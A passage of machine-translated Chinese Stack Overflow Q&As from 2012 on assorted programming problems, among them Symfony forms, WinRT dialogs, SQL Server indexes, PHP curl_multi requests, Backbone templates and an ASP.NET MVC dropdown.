            grafico.Series[0].Points.Add(new DataPoint(xvalue,0){IsEmpty=true});
      }
   ); 
```

# forms - Symfony2：给定类型“对象”，“整数”的预期参数

> ID：12839771
> 
> 赞同：1
> 
> 时间：2012-10-11T12:41:11.907
> 
> 标签：forms, symfony, entity

我正在尝试在下拉列表中创建一个表单。数据来自实体。问题是我得到了一个“对象”类型的预期参数，“整数”给定异常。

这是我尝试在表单中填充下拉列表的方式：

```
public function buildForm(FormBuilder $builder, array $options)
{
   $builder->add('country', 'entity', array(
        'class' => 'SciForumVersion2Bundle:Country',
        'property' => 'country',
    ));
} 
```

在我的实体国家/地区，我有

```
/**
 * @ORM\Column(type="text")
 */
protected $country; 
```

我在表单中编辑的对象是用户对象：

```
$enquiry = $this->get('security.context')->getToken()->getUser(); 
```

在用户实体中，我有

```
/**
 * @ORM\Column(type="integer")
 */
protected $country; 
```

我不知道为什么我会收到这个错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:51:21.923

您的模型设计中似乎存在问题，用户的“国家/地区”属性应该是[多对一关联](http://docs.doctrine-project.org/en/latest/reference/association-mapping.html#many-to-one-unidirectional)，而不是整数（这就是表单构建器抱怨的原因）：

```
/**
 * @ORM\ManyToOne(targetEntity="Country")
 * @ORM\JoinColumn(name="country_id", referencedColumnName="id")
 **/
private $country; 
```

“property”选项仅用于向用户显示实体选择，Symfony2 使用“add”方法的第一个参数来决定要编辑对象的哪个字段。

# c# - 在 DispatchTimer 中使用消息对话框时，在 Windows 8 应用程序中获取“访问被拒绝。（来自 HRESULT 的异常：0x80070005（E_ACCESSDENIED））”？

> ID：12839772
> 
> 赞同：1
> 
> 时间：2012-10-11T12:41:12.917
> 
> 标签：c#, .net, xaml, windows-8, windows-runtime

我正在尝试在调度计时器中使用消息对话框来在时间完成时更改用户。但有时它会给出以下错误：“访问被拒绝。（来自 HRESULT 的异常：0x80070005（E_ACCESSDENIED））”。如何解决这个问题？

代码：

```
 public DetailPage()
        {
      timer = new DispatcherTimer();
            timer.Tick += dispatcherTimer_Tick; 
            timer.Interval = new TimeSpan(0, 0, 1);
            this.txtTimer.Text = GlobalVariables.totalTime.Minutes + ":" + GlobalVariables.totalTime.Seconds + "mins";
            timer.Start();
}

  async void dispatcherTimer_Tick(object sender, object e)
    {
        if (GlobalVariables.totalTime.Minutes > 0 || GlobalVariables.totalTime.Seconds > 0)
        {
            GlobalVariables.totalTime = GlobalVariables.totalTime.Subtract(new TimeSpan(0, 0, 1));
            this.txtTimer.Text = GlobalVariables.totalTime.Minutes + ":" + GlobalVariables.totalTime.Seconds + " mins";
        }
        else
        {
            timer.Tick -= dispatcherTimer_Tick;
            timer.Stop();

            MessageDialog signInDialog = new MessageDialog("Time UP.", "Session Expired");

            // Add commands and set their callbacks
            signInDialog.Commands.Add(new UICommand("OK", (command) =>
            {
                this.Frame.Navigate(typeof(HomePage), "AllGroups");
            }));

            // Set the command that will be invoked by default
            signInDialog.DefaultCommandIndex = 1;

            // Show the message dialog
            await signInDialog.ShowAsync();
        }
    } 
```

我在以下位置收到错误：

```
 // Show the message dialog
        await signInDialog.ShowAsync(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T14:10:47.850

正如 Jeff 所说，计时器 Tick 事件处理程序代码运行在与 UI 线程不同的线程上。您必须返回此 UI 线程来操作 UI 中的任何内容：消息对话框、更改属性等。

```
// some code for the timer in your page
timer = new DispatcherTimer {Interval = new TimeSpan(0, 0, 1)};
timer.Tick += TimerOnTick;
timer.Start();

// event handler for the timer tick
private void TimerOnTick(object sender, object o)
{
    timer.Stop();
    var md = new MessageDialog("Test");

    this.Dispatcher.RunAsync(CoreDispatcherPriority.Normal, () => md.ShowAsync());
} 
```

请注意，我确实在事件处理程序中停止了计时器。如果您没有在显示另一个消息对话框之前及时关闭消息对话框，您也会在第二个 ShowAsync 上获得拒绝访问（因为第一个仍然打开）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:51:42.917

该`dispatcherTimer_Tick`方法在与 UI 不同的线程上运行。如果你想访问绑定到 UI 线程的东西，比如 UX，你必须回到 UI 线程。最简单的方法是用

```
Dispatcher.RunAsync() 
```

# objective-c - Facebook iOS SDK。用户点击“不允许”后的原生身份验证

> ID：12839777
> 
> 赞同：6
> 
> 时间：2012-10-11T12:41:25.820
> 
> 标签：objective-c, ios, facebook, authentication, ios6

使用 Native Auth 时，如果用户已经按下“不允许”，应用程序如何再次请求 auth 权限？

我制作了一个简单的应用程序，它使用 Native auth 对话框连接到 Facebook。测试时，我按了“不允许”。现在，每次我按下我创建的登录按钮时，它都会抛出一个错误，说身份验证被取消。在 Settings.app 中，我的应用在 Facebook 下已关闭。重新安装应用程序没有帮助。当用户点击“登录”时，如何让应用再次请求身份验证权限？

提前致谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-11T12:51:15.547

不幸的是，你不能。这是 IMO 的一个糟糕的 Apple 设计。随意提交有关它的雷达。与此同时，您必须告诉您的用户如何进入设置应用程序并打开您的应用程序。每个应用程序都有一个开关来关闭或打开对该 Facebook 帐户的访问。

# sql - 添加索引后的执行时间

> ID：12839779
> 
> 赞同：0
> 
> 时间：2012-10-11T12:41:32.127
> 
> 标签：sql, sql-server, performance, indexing

索引提高了数据访问性能。我尝试创建索引，但时间消耗没有区别。我在这里错过了什么吗？

我的架构看起来像这样。（49 列）。Id - PrimaryKey（聚集索引）

```
Id | Name | Age | CountryId | CourseId | ....... | EnrolledOn 
```

表中有大约 425,000 条记录。考虑到 country 和 course 是用于过滤记录的列，我创建了一个包含这两列的复合索引（这两列是外键）。

我尝试了以下查询。

```
Select * From Students Where CountryId = 1 And CourseId = 1 
```

没有索引和有索引的查询需要 11 秒。

> 注意：大约 415,000 条记录符合上述条件。这是否会成为消耗时间没有差异的原因。

谁可以帮我这个事。

```
CREATE NONCLUSTERED INDEX IX_Country_Course ON Students(CountryId,CourseId) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:58:11.337

而不是`*`在您的查询中，仅显式指定您要选择的列，并将这些列包含在您的索引中作为`included columns`..这将缩短选择时间..

希望您知道索引中列的顺序确实很重要..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:06:23.460

如果您从表中请求几乎每一行，则索引将无济于事。在这种情况下，如果您只选择索引中的字段，它只会加速，因此不需要原始表来获取所有请求的数据。

因此，仅选择 countryid，您可能会在上述问题案例中看到一些好处

# ruby - 如何实现复杂的消息验证/处理流程

> ID：12839780
> 
> 赞同：0
> 
> 时间：2012-10-11T12:41:36.540
> 
> 标签：ruby, design-patterns, architecture, business-logic

我正在开发一个 Web 服务（在 Ruby 中），它需要为它收到的每条消息做一些不同的事情。

在我的 Web 服务可以处理消息之前，它必须做不同的事情：

*   消毒（例如删除 HTML/JS）
*   检查格式（例如提供的有效电子邮件？）
*   检查黑名单中的IP
*   调用第 3 方 Web 服务
*   加上 10-30 个其他东西

我正在考虑实现一个过滤器/复合过滤器架构，其中每个步骤/阶段都是一个过滤器。例如，我可以有这些过滤器

*   清理输入过滤器
*   电子邮件过滤器
*   国家代码过滤器
*   黑名单过滤器

每个过滤器都应该可以拒绝一条消息，所以我正在考虑过滤器应该引发/抛出异常。

这将提供很大的灵活性，并希望有一个易于理解的代码库。

你会怎么做？以上设计的优缺点是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:48:59.983

对于过滤器本身实际发生故障（例如黑名单不可用等）并通过`true/false`返回值或如您还建议的那样抛出标签来指示有效/无效状态的情况，我会留下例外。

如果您不想在第一次失败时停止，但无论如何都要执行所有过滤器，您应该选择布尔返回类型并将它们连接在一起（`success &= next_filter(msg)`）

如果我正确理解了您的情况，过滤器既可以修改消息，也可以检查其他来源的有效性（例如黑名单）。

所以我会这样做：

```
module MessageFilters

  EmailValidator = ->(msg) do
    throw :failure unless msg.txt =~ /@/
  end

  HTMLSanitizer = ->(msg) do
    # this filter only modifies message, doesn't throw anything
    # msg.text.remove_all_html!
  end
end

class Message

  attr_accessor :filters
  def initialize
    @filters = []
  end

  def execute_filters!
    begin
      catch(:failure) do
        filters.each{|f| f.call self}
        true # if all filters pass, this is returned, else nil
      end
    rescue => e
      # Handle filter errors
    end
  end
end

message = Message.new

message.filters << MessageFilters::EmailValidator
message.filters << MessageFilters::HTMLSanitizer

success = message.execute_filters!  # returns either true or nil 
```

# c++ - 错误：在'{'令牌之前预期的不合格ID

> ID：12839783
> 
> 赞同：0
> 
> 时间：2012-10-11T12:41:48.863
> 
> 标签：c++, c, opencv

我正在进入`error: expected unqualified-id before '{' token`下面的代码片段。有人可以弄清楚出了什么问题吗？这是来自 opencv2.1 包的代码片段。

当我使用 stasm 包中的 make 文件构建 stasm 包时，我得到了这个。

```
/* Runtime assertion macro */
    #define CV_ASSERT( Condition )                                          \
    {                                                                       \
        if( !(Condition) )                                                  \

            CV_ERROR( CV_StsInternal, "Assertion: " #Condition " failed" ); \
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:43:16.573

之间有一条额外的线：

```
 if( !(Condition) )                                                  \

        CV_ERROR( CV_StsInternal, "Assertion: " #Condition " failed" ); \ 
```

那不应该在那里。它应该是

```
 if( !(Condition) )                                                  \
        CV_ERROR( CV_StsInternal, "Assertion: " #Condition " failed" ); \ 
```

或者

```
 if( !(Condition) )                                                  \
                                                                        \
        CV_ERROR( CV_StsInternal, "Assertion: " #Condition " failed" ); \ 
```

# php - PHP 函数名称必须是新变量上的字符串错误

> ID：12839785
> 
> 赞同：1
> 
> 时间：2012-10-11T12:41:54.620
> 
> 标签：php

我收到错误消息：

函数名称必须是此代码上的字符串：

```
$profile_data = $user_data('first_name','last_name','email'); 
```

任何想法为什么会这样？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:44:25.983

虽然您*可以*将变量用作函数名称，但这样做需要变量是字符串。

这个变量`$user_data`听起来更像一个数组，甚至可能是一个对象。如果这是真的，您将收到指定的错误。根据@Jon 的评论，它也可能`user_data()`是一种方法并且`$`是一个错字。

如果以上都没有帮助，请使用所有相关代码，特别是`$user_data`变量（或`var_dump($user_data)`输出）的创建。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:45:59.620

在 php 函数中定义如下

```
$profileData =  user_date('first_name','last_name','email');

function user_date($first_name,$last_name,$email){
} 
```

# actionscript-3 - 参考错误：1069：尝试从服务器 FMS（Flash 媒体服务器）调用客户端函数时

> ID：12839789
> 
> 赞同：0
> 
> 时间：2012-10-11T12:42:06.210
> 
> 标签：actionscript-3, apache-flex, flex3, flash-media-server

目前我正在使用 flex 和 FMS（Flash 媒体服务器）进行客户端和服务器端通信。
我正在尝试执行以下程序，该程序每 2 秒检查一次连接状态，如果客户端没有响应则断开连接。

这里我收到一个错误：
**ReferenceError：错误 #1069：在 flash.net.NetConnection 上找不到属性 ping，并且没有默认值。**

**客户端代码**

```
<?xml version="1.0" encoding="utf-8"?>
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" layout="absolute">
<mx:Script>
<![CDATA[

    import flash.net.NetConnection;
    public var nc:NetConnection;
    public var res:Responder;
    public function netconn():void
    {
        nc = new NetConnection();
        nc.connect("rtmp://127.0.0.1/ChkConn",user.text);
        nc.addEventListener(NetStatusEvent.NET_STATUS, handle);
    }
    public function handle(event:NetStatusEvent):void
    {
        switch(event.info.code)
        {
            case "NetConnection.Connect.Success":
            status.text="Connected";
            break;
            case "NetConnection.Connect.Failed":
            status.text="Failed";
            break;
            case "NetConnection.Connect.Rejected":
            status.text="Rejected";
            break;
            case "NetConnection.Connect.Disconnect":
            trace("coming");
            status.text="Close";
            break;

        }

    }

    public function pings():void
    {
        trace("a ping call from the server has been received");
    }

    public function disconn():void 
  {
nc.close();
nc.addEventListener(NetStatusEvent.NET_STATUS, handle);
status.text="Disconnected";

}

]]> 
</mx:Script>

<mx:Panel x="224" y="41" width="348" height="118" layout="absolute">
    <mx:TextInput x="84" y="24" id="user"/>
    <mx:Button x="253" y="24" label="Connect" click="netconn()"/>
    <mx:Text x="10" y="26" text="Username"/>
</mx:Panel>
<mx:Text x="235" y="207" text="Status:"/>
<mx:Text x="295" y="207" text="Disconnected" id="status"/>
<mx:Button x="295" y="263" label="Disconnect" click="disconn()"/> 
```

**服务器端代码**

```
 // ActionScript Communications Document
 application.onAppStart=function()
 {
trace("Application Start");
 };
application.onConnect=function(client,name)
{
anyvariable=name;

monitorConnection(client);
if(name!="user1")
{
    application.rejectConnection(client);
    trace(name+" Rejected");
}
else
{
application.acceptConnection(client);
trace(name+" Connect"); 
}

 };

clientPingResponder = function(client) {

this.onResult = function(res) {
    trace("ClientPingResponder.onResult Received: " + res);
    clearInterval(client.cleanupTaskId);
} 

this.onStatus = function(info) {
    trace("ClientPingResponder.onStatus Received: " + info);
}
};
monitorConnection = function(client) {

client.isAlive = function() {
    trace("client.isAlive has been fired");
    client.cleanupTaskId = setInterval(client.dead, 2 * 1000);
    client.call("pings", new clientPingResponder(client));
}

client.dead = function() {
    trace("cleanupTaskId: " + client.cleanupTaskId);
    trace("monitorTaskId: " + client.monitorTaskId);

    clearInterval(client.cleanupTaskId);
    clearInterval(client.monitorTaskId);

    trace("ghost connection has been detected");

    application.disconnect(client);
}

client.monitorTaskId = setInterval(client.isAlive, 7*1000);
trace("detected");
}

application.onDisconnect=function(client)
{
//application.disconnect(client);
trace(anyvariable +" Disconnect");
}; 
```

任何帮助都会得到帮助。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T19:05:43.177

你需要类似的东西。

```
nc.client = this; 
```

# android - Android Emulator 4 上的摄像头为 HIGH DEF

> ID：12839792
> 
> 赞同：3
> 
> 时间：2012-10-11T12:42:15.343
> 
> 标签：android, camera, emulation

我是 Android 开发的新手。我使用的是 Android 4.x 版本，它模拟了分辨率非常低的网络摄像头，比如 640x480。

我需要制作一个模拟网络摄像头，以便它可以在高清模式下工作，例如 (4320x2880)。在 android 2.x 中，我使用了变量 hw.camera.maxHorizo​​ntalPixels 和 hw.camera.maxVerticalPixels，但看起来它们在 Android 4.x 网络摄像头模拟器中不再起作用。请协助，如何在新模拟器中设置高清相机分辨率。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-23T12:42:08.603

简短形式：今天似乎没有这个选项。

长格式：`devices.xml`，在您的 Android 目录（例如`~/.android/`）中，使用~~[此 XML 模式](https://android.googlesource.com/platform/sdk/+/master/device_validator/dvlib/src/main/resources/com/android/dvlib/devices.xsd)~~，这是我再也找不到的 XML 模式。相机的唯一可配置选项似乎是位置（前/后）、闪光灯和自动对焦。由于`devices.xml`现在控制您的模拟器的行为，因此似乎没有与旧分辨率选项等效的选项。

# php - 使用 POST 的异步 cURL

> ID：12839793
> 
> 赞同：4
> 
> 时间：2012-10-11T12:42:17.037
> 
> 标签：php, curl, http-post

我正在制作一个**命令行**应用程序。执行登录程序后，我需要同时通过 cURL 发送多个 POST 请求 - 这意味着传出请求必须发送会话 ID 等。

事件链如下：

1.  我用 curl_init 打开 cURL 连接
2.  我登录到使用 curl_exec 发送 POST 请求的远程站点并获得返回的 HTML 代码作为响应
3.  我同时向同一个站点发送多个 POST 请求。

我正在考虑使用类似的东西：

```
// Init connection

$ch = curl_init();

// Set curl options

curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POST, 1);

// Perform login

curl_setopt($ch, CURLOPT_URL, "http://www.mysite/login.php");
$post = array('username' => 'username' , 'password' => 'password');
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
$result = curl_exec($ch);

// Send multiple requests after being logged on

curl_setopt($ch, CURLOPT_TIMEOUT_MS, 1);

for($i = 0 ; $i < 10 ; $i++){
    $post = array('myvar' => 'changing_value');
    curl_setopt($ch, CURLOPT_URL, 'www.myweb.ee/changing_url');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    curl_exec($ch);
} 
```

但这似乎不起作用，因为似乎只发送了循环中的第一个请求。

使用`curl_multi_init`可能是一种解决方案，但我不知道我是否可以多次传递相同的 cURL 句柄并更改每个选项。

对于这些同时请求，我不需要服务器的任何响应，但如果它也可以以某种方式完成，那就太棒了。

如果有人可以将我推向正确的方向，那将是完美的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T13:21:18.860

您需要为每个请求创建一个新的 curl 句柄，然后使用[http://www.php.net/manual/en/function.curl-multi-add-handle.php注册它](http://www.php.net/manual/en/function.curl-multi-add-handle.php)

这是我从我的代码库中提取并改编的一些代码，请记住，您应该在其中添加错误检查。

```
function CreateHandle($url , $data) {
    $curlHandle = curl_init($url);

    $defaultOptions = array (
        CURLOPT_COOKIEJAR => 'cookies.txt' ,
        CURLOPT_COOKIEFILE => 'cookies.txt' ,

        CURLOPT_ENCODING => "gzip" ,
        CURLOPT_FOLLOWLOCATION => true ,
        CURLOPT_RETURNTRANSFER => true ,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $data
    );

    curl_setopt_array($curlHandle , $defaultOptions);

    return $curlHandle;
}

function MultiRequests($urls , $data) {
    $curlMultiHandle = curl_multi_init();

    $curlHandles = array();
    $responses = array();

    foreach($urls as $id => $url) {
        $curlHandles[$id] = CreateHandle($url , $data[$id]);
        curl_multi_add_handle($curlMultiHandle, $curlHandles[$id]);
    }

    $running = null;
    do {
        curl_multi_exec($curlMultiHandle, $running);
    } while($running > 0);

    foreach($curlHandles as $id => $handle) {
        $responses[$id] = curl_multi_getcontent($handle);
        curl_multi_remove_handle($curlMultiHandle, $handle);
    }
    curl_multi_close($curlMultiHandle);

    return $responses;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T16:23:45.717

有一个更快、更有效的选择……根本不需要你使用任何 curl ……

[http://uk3.php.net/manual/en/book.pthreads.php](http://uk3.php.net/manual/en/book.pthreads.php) http://pthreads.org

请参阅 github 获取最新源代码，pecl 上的发布......

我会这么说，file_get_contents 可能看起来很吸引人，但是 PHP 从来没有被设计为以这种方式运行线程，它的套接字层等不考虑消耗你可能会发现最好在少量读取之间打开和休眠以节省 CPU 使用率...无论您做什么都会好得多...以及如何做取决于您要投入什么样的资源来完成任务...

# java - Twilio API 中的“p1connected”和“入站呼叫”有什么区别

> ID：12839801
> 
> 赞同：1
> 
> 时间：2012-10-11T12:42:31.493
> 
> 标签：java, twilio

我想知道 Twilio API 之间的`P1connected`区别`InboundCall`。

```
switch (requestedop){
            case P1Connected:
                output = //calling a method
                break;
            case P2Connected:
                output = //calling a method
                break;
            case EndCall:
                output = //calling a method
                break;
            case TranscribeCallBack:
                output = //calling a method
                break;
            case InboundCall:
                output =//calling a method
                break;
            case InboundCallForward:
                output = //calling a method
                break;  
            case InboundSms:
                output = //calling a method
                break;
            case FallBack:
                output = //calling a method
                break;
            case MissedCall:
                output = //calling a method
                break;
            default:
                throw new ServletException ("Operation not supported.");
        } 
```

我用谷歌搜索了它，但没有找到确切的区别。

# javascript - 在backbonejs中编译模板是什么意思等等

> ID：12839802
> 
> 赞同：1
> 
> 时间：2012-10-11T12:42:35.517
> 
> 标签：javascript, backbone.js

我正在尝试通过几个文档阅读 Backbonejs。它是客户端的 MVC 框架。在视图中，我们编译模板并渲染它们（将它们附加到 DOM，或进行一些操作）。Backbone 有一个下划线 js 的依赖，这是模板的东西。

使用 Bbone，当操作视图时，`el`图像就出现了。我的理解`el`是它引用了`DOM Object`. 如果没有为其分配 dom 对象，则它假定为*空 div*。

var choose_view = new SearchView({ el: $("#choose_me") });

所以在上面的例子中，id为choose_me的div会在调用choose_view时被操作。到目前为止一切都很好，但是按时间顺序发生的事情是什么，我无法得到，还有任何冗余，请阅读查询评论：

```
// the div with id search_container will be picked up by el
<div id="search_container"></div>

<script type="text/javascript">
    SearchView = Backbone.View.extend({
        initialize: function(){
            this.render();
        },
        render: function(){
            //1\. Compile the template using underscore, QUESTION: **what does this mean**?
            var template = _.template( $("#search_template").html(), {} );
            //2\. Load the compiled HTML into the Backbone "el"
            this.el.html( template );
        }
    });
    // QUESTION: **When in 2\. we have already mentioned, el, can we not over there
    provide the div element?**
    var search_view = new SearchView({ el: $("#search_container") });
</script>

<script type="text/template" id="search_template">
    <label>Search</label>
    <input type="text" id="search_input" />
    <input type="button" id="search_button" value="Search" />
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:04:49.383

问题 1

编译模板意味着您获得一个模板函数，您可以将数据对象作为模板函数的参数传入。这样，您可以使用不同的数据对象多次评估模板函数，而它只编译一次。

```
compiledTemplate = _.template( $("#search_template").html());
this.el.html(compiledTemplate(data));
another.el.html(compiledTemplate(otherData)); 
```

在上面的示例中，您**编译**模板一次，然后**使用**它两次。在您提供的代码中，您同时**编译**和**使用**您的模板

所以

```
_.template( $("#search_template").html()); // Create a template function, the result is a function that you can call with a data object as argument
_.template( $("#search_template").html(), data); // Create a template function and call it directly with the data object provided, the result is a string containing html 
```

参考：[http ://underscorejs.org/#template](http://underscorejs.org/#template)

问题2

您可以直接提供 div 元素，但 el 是一个帮助器，用于检索将委托所有 DOM 事件的视图的根元素。

如主干文档中所示

> 如果您想创建一个引用 DOM 中已有元素的视图，请将元素作为选项传入：`new View({el: existingElement})`

参考：[http ://backbonejs.org/#View-el](http://backbonejs.org/#View-el)

# tfsbuild - TFS 全局列表在现场集成中不可用

> ID：12839814
> 
> 赞同：0
> 
> 时间：2012-10-11T12:43:04.163
> 
> 标签：tfsbuild, workitem

我们定制了用于 TFS 2010 的 CMMI 流程模板。

为避免全局列表中的 Builds - [Team Project] 列表泛滥，我们从 TFS 中删除了事件订阅，该订阅会在每个构建 (BISSUBSCRIBE) 中填充此列表。只有当构建质量设置为“准备好进行初始测试”时，我们才会填写此列表，并使用 TFS 插件监视构建质量的变化（在[此处](http://intovsts.net/category/team-build/ "这里")找到）。构建在“构建 - [TeamProjectName]”下的全局列表中列出。全局列表看起来不错，但这些项目在工作项中不可用（错误字段“集成构建”等）。

我们的错误工作项类型字段“集成构建”定义如下：

```
<FieldDefinition name="Integration Build" refname="Microsoft.VSTS.Build.IntegrationBuild" type="String" reportable="dimension">
    <SUGGESTEDVALUES>
        <LISTITEM value="&lt;None&gt;" />
    </SUGGESTEDVALUES>
    <HELPTEXT>The build in which the bug was fixed</HELPTEXT>
</FieldDefinition> 
```

用于编辑集成构建的控件的错误工作项类型布局定义如下：

```
<Control FieldName="Microsoft.VSTS.Build.IntegrationBuild" Type="FieldControl" Label="&amp;Integrated In:" LabelPosition="Left" /> 
```

似乎我们削减了将项目从全局列表中拉入控件的魔法。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T19:51:44.727

```
 <SUGGESTEDVALUES expanditems="true" filteritems="excludegroups">
      <GLOBALLIST name="Builds - XXXXX" />
    </SUGGESTEDVALUES> 
```

我认为这是您基于我们的模板所需要的，其中 XXXXX 是项目名称。我们是在您已经存在的建议值之后添加的，因此我们有两个这样的节点

# asp.net-mvc - ASP.NET & MVC3 DropDownList 和 Url 参数

> ID：12839818
> 
> 赞同：0
> 
> 时间：2012-10-11T12:43:25.693
> 
> 标签：asp.net-mvc, url-parameters, html-select

对于我的工作，我需要开发一个 Web 应用程序以显示一些银行应用程序的工作列表。实际上，这个应用程序的最大部分已经完成，但我必须包含一个允许选择工作类型的下拉列表。我在这一点上完全受阻。

在我的索引页面上，我有一个列表，其中列出了一些应用程序及其状态（工作 OK、KO、...），用户可以单击应用程序的状态（这是一个图像）以显示另一个页面，其中显示一个更详细的列表，其中包含 2 个参数函数中的一些信息：应用程序和银行 ID。这是我认为的链接：

```
<a href="@Url.Action("PageDomaines", new { Controller = "Suivi", CR = VarCR, Appli = VarAppli[j] })">
<img src="../../Content/Images/feu_rouge.png" alt="Statut OK" border="0" /></a> 
```

2 个参数 CR 和 Appli 从我的视图传递到 URL 到好的操作，之后，我对它们进行查询以获取列表。

问题是当我在位于操作“PageDomains”视图中的下拉列表中选择一个值时，不会保留参数，显示一个空列表。我已经做了一些测试，比如验证我的下拉列表中选择的值是否发送到我的控制器并且它有效，我可以显示在“PageDomaines”视图中选择的值，但我没有保留我的参数 CR 和 Appli ...

这是我的查询操作“PageDomaines”：

```
public ActionResult PageDomaines(string CR, string Appli, string DDL)
    {

        string GetCR = CR;
        string GetAppli = Appli;
        string GetDDL = DDL;

        if (GetDDL == null)
        {
            var items = GetDomaines();
            int Var1 = DateTime.Now.Year;
            int Var2 = DateTime.Now.Month;
            string Var3 = "" + Var1 + Var2;

            var Query = (from i in items
                         where i.Field<String>("CD_APPLI") == GetAppli && i.Field<String>("CD_CR") == GetCR && i.Field<Int64>("PERIODE").ToString().Contains(Var3)
                         select new Suivi { CD_TRT = i.Field<String>("CD_TRT"), LB_TRT = i.Field<String>("LB_TRT"), CD_CR = i.Field<String>("CD_CR"), PERIODE = i.Field<Int64>("PERIODE"), CD_APPLI = i.Field<String>("CD_APPLI"), STATUT = i.Field<String>("STATUT") }).ToList();

            ViewData["CR"] = GetCR;
            ViewData["Appli"] = GetAppli;

            return View(Query);
        }
        else
        {
            var items = GetDomaines();
            int Var1 = DateTime.Now.Year;
            int Var2 = DateTime.Now.Month;
            string Var3 = "" + Var1 + Var2;
            ViewData["DDL"] = GetDDL;
            var Query = (from i in items
                         where i.Field<String>("CD_APPLI") == GetAppli && i.Field<String>("CD_CR") == GetCR && i.Field<Int64>("PERIODE").ToString().Contains(Var3) && i.Field<String>("CD_TRT").Trim() == GetDDL
                         select new Suivi { CD_TRT = i.Field<String>("CD_TRT"), LB_TRT = i.Field<String>("LB_TRT"), CD_CR = i.Field<String>("CD_CR"), PERIODE = i.Field<Int64>("PERIODE"), CD_APPLI = i.Field<String>("CD_APPLI"), STATUT = i.Field<String>("STATUT") }).ToList();

            ViewData["CR"] = GetCR;
            ViewData["Appli"] = GetAppli;

            return View(Query);
        }
    }

    private List<DataRow> GetDomaines()
    {

        List<DataRow> liste = null;

        string query = "select CD_TRT, LB_TRT, CD_CR, PERIODE, CD_APPLI, case "
        + "when (exists (select 1 from dbo.LOGS l, dbo.REF_JOB j  where j.CD_JOB = l.CD_JOB and j.CD_TRT = t.CD_TRT and l.CD_CR = cr.CD_CR and l.STATUT = 'OK' and j.JR_EXEC >= DAY(l.DT_DEB))) "
        + "and not exists (select 1 from dbo.LOGS l, dbo.REF_JOB j  where j.CD_JOB = l.CD_JOB and j.CD_TRT = t.CD_TRT and l.CD_CR = cr.CD_CR  and l.PERIODE = p.PERIODE "
        + "and ((j.JR_EXEC < DAY(l.DT_DEB) and l.DT_DEB is not null) or (l.STATUT in('KO','NEXEC')))) then 'OK' "
        + "when (exists(select 1 from dbo.LOGS l, dbo.REF_JOB j  where j.CD_JOB = l.CD_JOB and j.CD_TRT = t.CD_TRT and l.CD_CR = cr.CD_CR  and l.PERIODE = p.PERIODE and j.JR_EXEC < DAY(l.DT_DEB) "
        + "and DAY(l.DT_DEB) IS not null and l.STATUT = 'KO')) then 'KO' "
        + "when (exists(select 1 from dbo.LOGS l, dbo.REF_JOB j  where j.CD_JOB = l.CD_JOB and j.CD_TRT = t.CD_TRT and l.CD_CR = cr.CD_CR  and l.PERIODE = p.PERIODE "
        + "and j.JR_EXEC < DAY(l.DT_DEB) and DAY(l.DT_DEB) IS not null and l.STATUT in('OK','NEXEC'))) then 'EN COURS' "
        + "when (exists(select 1 from dbo.LOGS l, dbo.REF_JOB j  where j.CD_JOB = l.CD_JOB and j.CD_TRT = t.CD_TRT and l.CD_CR = cr.CD_CR  and l.PERIODE = p.PERIODE "
        + "and j.JR_EXEC < DAY(l.DT_DEB) and DAY(l.DT_DEB) IS not null)) then 'EN RETARD' else 'NON INITIE' end STATUT "
        + "from dbo.REF_TRT t, dbo.REF_CR cr, (select distinct PERIODE from dbo.LOGS) p ";

        string connString = "Data Source=.;Initial Catalog=SUIVI_DWH;Integrated Security=True";

        using (SqlConnection conn = new SqlConnection(connString))
        {
            using (SqlCommand objCommand = new SqlCommand(query, conn))
            {
                objCommand.CommandType = CommandType.Text;
                DataTable dt = new DataTable();
                SqlDataAdapter adp = new SqlDataAdapter(objCommand);
                conn.Open();
                adp.Fill(dt);
                if (dt != null)
                {
                    liste = dt.AsEnumerable().ToList();
                }
            }
        }

        return liste;
    }

    private List<DataRow> GetPERIODE()
    {
        List<DataRow> liste = null;

        string query = "select distinct PERIODE from dbo.LOGS";

        string connString = "Data Source=.;Initial Catalog=SUIVI_DWH;Integrated Security=True";

        using (SqlConnection conn = new SqlConnection(connString))
        {
            using (SqlCommand objCommand = new SqlCommand(query, conn))
            {
                objCommand.CommandType = CommandType.Text;
                DataTable dt = new DataTable();
                SqlDataAdapter adp = new SqlDataAdapter(objCommand);
                conn.Open();
                adp.Fill(dt);
                if (dt != null)
                {
                    liste = dt.AsEnumerable().ToList();
                }
            }
        }

        return liste;
    } 
```

以及“PageDomaines”的观点：

```
@model IEnumerable<SUIVI_DWH.Models.Suivi>
@using SUIVI_DWH.Helpers
@{
    ViewBag.Title = "PageDomaines";
}
<h2>@ViewData["CR"]
    @ViewData["Appli"]
    @ViewData["DDL"]
</h2>
@using (Html.BeginForm("PageDomaines", "Suivi"))
{
    @Html.DropDownList("DDL", new SelectList(new[] { "MMCR", "MMCL", "MMCO", "MMSE", "MMAS" }), "--Select one--", new { onchange = "this.form.submit();" })
}

<table>
    <tr>
        <th>
